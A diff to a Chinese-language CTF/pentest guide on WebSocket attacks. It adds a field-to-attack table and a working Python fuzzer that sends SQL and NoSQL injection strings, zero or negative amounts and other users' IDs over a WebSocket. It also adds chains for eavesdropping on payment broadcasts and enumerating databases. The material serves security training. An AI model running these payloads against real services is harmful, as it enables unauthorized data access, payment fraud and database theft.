@@ -11,11 +11,11 @@ category: "07-client"
 signals: ["WebSocket", "CSWSH", "Socket.IO", "MQTT", "消息注入", "race condition", "跨域WebSocket"]
 mcp_tools: ["http_probe", "kb_router"]
 keywords: ["WebSocket攻击", "CSWSH", "Socket.IO越权", "MQTT", "消息重放", "跨域WebSocket", "竞态攻击", "WebSocket注入"]
-difficulty: "intermediate"
-tags: ["websocket", "client-side", "web-security", "injection", "ctf"]
+difficulty: "advanced"
+tags: ["websocket", "client-side", "injection", "realtime", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: []
+related_articles: ["ctf-website/03-injection/graphql", "ctf-website/08-infra/race-cache-smuggling", "ctf-website/12-payment/payment-race-lost-update", "ctf-website/14-idor/01-idor-enumeration", "ctf-website/24-database/02-sqli-advanced"]
 ---
 # WebSocket 攻击实战
 
@@ -53,6 +53,71 @@ HTTP 101
 ```
 
 如果服务端只在 `connection_init` 鉴权，后面的 `join`、`subscribe`、`action` 就是主要突破口。
+
+### 0.1 实时事件到订单/支付/SQL Oracle
+
+实时接口不要只看 `recv` 有没有消息，要把事件字段映射到账户、订单、库存、钱包和数据库查询路径。WebSocket 经常绕开 REST API 的中间件，直接进入 handler、queue consumer 或 GraphQL subscription resolver。
+
+| 事件位置 | 字段 | 变体 | 命中信号 | 下一跳 |
+|---|---|---|---|---|
+| `join` / `subscribe` | `roomId`, `userId`, `orderId`, `tenantId` | 换成他人 ID、`admin`、`*`、历史订单号 | 收到跨账号 broadcast 或订单状态 | IDOR、GraphQL subscription、订单信息复取 |
+| `action` / `event` | `type`, `op`, `method`, `command` | 调后台事件名、旧事件名、debug 事件 | handler 命中、错误栈泄露 resolver 名 | API discovery、SQLi 参数定位 |
+| 时序字段 | `seq`, `nonce`, `timestamp`, `version` | 旧值、乱序、重复、未来时间 | 重复 ack、重复入账、覆盖新状态 | payment race、lost update |
+| 金额字段 | `amount`, `price`, `balance`, `quantity`, `discount` | `0`, `-1`, 小数精度, 超大数 | 钱包/订单/库存状态改变 | 支付逻辑、数据库约束绕过 |
+| 查询字段 | `filter`, `where`, `sort`, `cursor`, `search` | SQL/NoSQL/GraphQL 片段 | SQL error、列名、分页越界 | SQLi advanced、GraphQL resolver |
+| 回执字段 | `ack`, `result`, `broadcast`, `error` | 对比 A/B 身份和并发批次 | 只给当前连接成功但全局状态改变 | 持久化状态复读 |
+
+```python
+# ws_event_oracle_matrix.py
+import asyncio
+import csv
+import json
+import time
+import websockets
+
+FIELDS = {
+    "roomId": ["admin", "payments", "orders", "*", "../admin"],
+    "userId": [0, 1, 2, 999999],
+    "orderId": [1, 2, 999999, "' OR '1'='1"],
+    "amount": [0, -1, 0.01, 99999999],
+    "price": [0, -1, "0.00", "1e309"],
+    "seq": [0, 1, -1, 999999999],
+    "filter": ["*", "' OR 1=1--", '{"$ne":null}', "id desc"],
+}
+
+async def ask(ws, msg, timeout=2):
+    await ws.send(json.dumps(msg, separators=(",", ":")))
+    try:
+        raw = await asyncio.wait_for(ws.recv(), timeout=timeout)
+        return raw[:1000]
+    except asyncio.TimeoutError:
+        return "TIMEOUT"
+
+async def matrix(ws_url, cookie, template, out_csv="exports/ws_event_oracle_matrix.csv"):
+    headers = {"Cookie": cookie} if cookie else {}
+    rows = []
+    async with websockets.connect(ws_url, extra_headers=headers) as ws:
+        base_resp = await ask(ws, template)
+        rows.append(["baseline", "", json.dumps(template), base_resp, int(time.time())])
+        for field, values in FIELDS.items():
+            if field not in template:
+                continue
+            for value in values:
+                msg = dict(template)
+                msg[field] = value
+                resp = await ask(ws, msg)
+                rows.append([field, repr(value), json.dumps(msg, ensure_ascii=False), resp, int(time.time())])
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        csv.writer(f).writerows([["field", "value", "payload", "response", "ts"], *rows])
+
+asyncio.run(matrix(
+    "wss://target/ws",
+    "session=xxx",
+    {"type": "subscribe", "roomId": "orders", "userId": 1001, "orderId": 9001, "seq": 1}
+))
+```
+
+打完矩阵后立刻读 REST/GraphQL/前端状态页：`/api/orders/<id>`、`/api/wallet`、`/api/payments`、`/api/me`。如果 WebSocket 回了 `ack=false`，但订单、余额或 entitlement 已变化，说明业务副作用先于校验落库；如果返回 SQL error 或列名，直接转 `24-database/02-sqli-advanced`。
 
 ## 抓取与重放
 
@@ -354,11 +419,13 @@ Socket.IO → 房间越权 → join admin_room → 实时监听 flag
 MQTT → subscribe # → 监听所有主题 → IoT 配置/密码泄露
 WebSocket → 消息注入 → SQLi/NoSQLi → 拖库
 WebSocket → 时序攻击 → 先改状态再验证 → 竞态绕过
+WebSocket → subscription 越权 → 监听订单/支付 broadcast → 支付回调参数复用
+WebSocket → filter/orderBy 注入 → SQL error/列名 → 数据库枚举
 ```
 
 ## Evidence
 
-记录: 握手请求头、`101` 响应头、Origin 变体、Cookie/SameSite、第一条认证消息、收发消息 JSON/text、修改字段后的响应差异、Socket.IO namespace/room/event、竞态并发数和结果。
+记录: 握手请求头、`101` 响应头、Origin 变体、Cookie/SameSite、第一条认证消息、收发消息 JSON/text、`exports/ws_event_oracle_matrix.csv`、修改字段后的响应差异、Socket.IO namespace/room/event、竞态并发数、订单/钱包/支付状态读数、SQL error 或 resolver 名。
 
 ## MCP 工具映射
 
